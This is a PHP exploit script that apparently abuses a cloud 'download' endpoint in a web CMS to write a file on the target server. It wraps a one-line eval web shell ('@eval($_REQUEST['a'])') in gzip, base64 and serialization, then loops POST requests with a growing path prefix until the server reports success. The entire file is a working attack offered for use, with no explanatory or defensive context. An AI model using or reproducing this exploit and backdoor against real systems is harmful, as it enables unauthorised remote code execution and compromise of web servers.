<?php
/*$shell = gzcompress('<?php @eval($_REQUEST[\'a\']);?>');*/
$shell = '<?php @eval($_REQUEST[\'a\']);?>';
$path = 'a.php';
while(1){
    $path = '/'.$path;
    $file = gzcompress($shell);
    echo $path;
    $a = array('file' => base64_encode($file), 'path' => $path, 'sign' => 0);
    $data = serialize($a);
    $payload = base64_encode($data);
    $result = POST('wwwww.test.cn',80,'/web/index.php?c=cloud&a=dock&do=download',$payload,10);
    echo $result;
    if(strstr($result,'success')){
        echo 'get it';
        break;
    }
}

function POST($host,$port,$path,$data,$timeout) {

	$buffer='';
    $fp = fsockopen($host,$port,$errno,$errstr,$timeout);
    if(!$fp) die($host.'/'.$path.' : '.$errstr.$errno); 
	else {
        fputs($fp, "POST $path HTTP/1.0\r\n");
        fputs($fp, "Host: $host\r\n");
        fputs($fp, "Content-type: application/x-www-form-urlencoded\r\n");
        fputs($fp, "Content-length: ".strlen($data)."\r\n");
        fputs($fp, "Connection: close\r\n\r\n");
        fputs($fp, $data."\r\n\r\n");
		while(!feof($fp)) 
		{
			$buffer .= fgets($fp,4096);
		}

		fclose($fp);
    } 
	return $buffer;
}
?>
